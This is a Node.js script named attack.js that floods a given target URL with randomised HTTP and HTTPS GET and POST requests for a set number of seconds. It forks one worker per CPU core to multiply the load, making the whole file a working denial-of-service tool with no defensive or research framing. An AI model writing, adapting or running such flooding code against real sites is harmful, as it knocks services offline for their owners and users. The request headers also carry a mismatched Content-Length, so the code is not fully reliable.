const http = require('http');
const https = require('https');
const url = require('url');
const { fork } = require('child_process');
const os = require('os');

if (process.argv.length < 4) {
    console.log('Usage: node attack.js <target> <time>');
    process.exit();
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
const parsed = url.parse(target);
const endTime = Date.now() + duration;

const cpus = os.cpus().length;

if (process.argv[4] !== 'child') {
    // master process, fork children
    for (let i = 0; i < cpus; i++) {
        fork(__filename, [target, process.argv[3], 'child']);
    }
    return;
}

// CHILD: actual flood logic
let sent = 0;

function randMethod() {
    return Math.random() > 0.5 ? 'GET' : 'POST';
}

function randProtocol() {
    // 50/50 http/https
    const isHttps = Math.random() > 0.5;
    return isHttps ? https : http;
}

function randPayload() {
    return 'a=' + Math.random().toString(36).substring(2);
}

function flood() {
    const method = randMethod();
    const protocol = randProtocol();
    const isHttps = protocol === https;

    const options = {
        host: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.path || '/',
        method,
        headers: {
            Host: parsed.hostname,
            'User-Agent': 'Mozilla/5.0 (UltraFlood)',
            Connection: 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(randPayload())
        }
    };

    try {
        const req = protocol.request(options);
        if (method === 'POST') {
            req.write(randPayload());
        }
        req.on('error', () => {});
        req.end();
        sent++;
        console.log(`(${sent}) Sent ${method} to ${isHttps ? 'HTTPS' : 'HTTP'} ${target}`);
    } catch (e) {}
}

function goNuts() {
    while (Date.now() < endTime) {
        flood();
    }
    console.log(`Done. Sent ${sent} requests.`);
}

goNuts();
